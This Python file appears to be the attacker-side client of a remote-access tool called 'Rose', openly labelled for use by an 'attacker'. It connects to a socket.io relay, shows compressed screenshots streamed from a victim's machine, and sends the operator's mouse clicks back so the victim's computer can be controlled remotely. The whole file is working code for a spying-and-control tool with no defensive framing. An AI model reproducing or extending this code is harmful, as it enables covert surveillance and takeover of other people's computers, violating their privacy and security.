import eventlet
import socketio
from threading import Thread
from zlib import decompress

from mss import mss
import pygame 

WIDTH = 1900
HEIGHT = 1000

link = "http://127.0.0.1:3000"
_sio = socketio.Client()
pygame.init()
screen = pygame.display.set_mode((WIDTH, HEIGHT))
clock = pygame.time.Clock()

pygame.display.set_caption('Rose - Screenshare client - made by xpierroz')


@_sio.event
def connect():
    print('screenshare attacker client connected')
    _sio.emit("iam_attacker")

_sio.connect(link)

while True:
    for event in pygame.event.get():
        if event.type == pygame.MOUSEBUTTONUP:
            pos = pygame.mouse.get_pos()
            print(pos)
            print(type(pos))
            _sio.emit("mouse_click", {"data": {
                "x": pos[0],
                "y": pos[1]
            }})

        if event.type == pygame.QUIT:
            pygame.quit()

    @_sio.event
    def receiving_screenshot(data):
        #msize_len = data['data']['size_len']
        #msize_bytes = data['data']['size_bytes']
        mpixels = data['data']['pixels']
        pixels = decompress(mpixels)

        # Create the Surface from raw pixels
        img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

        # Display the picture
        screen.blit(img, (0, 0))
        pygame.display.flip()
        clock.tick(60)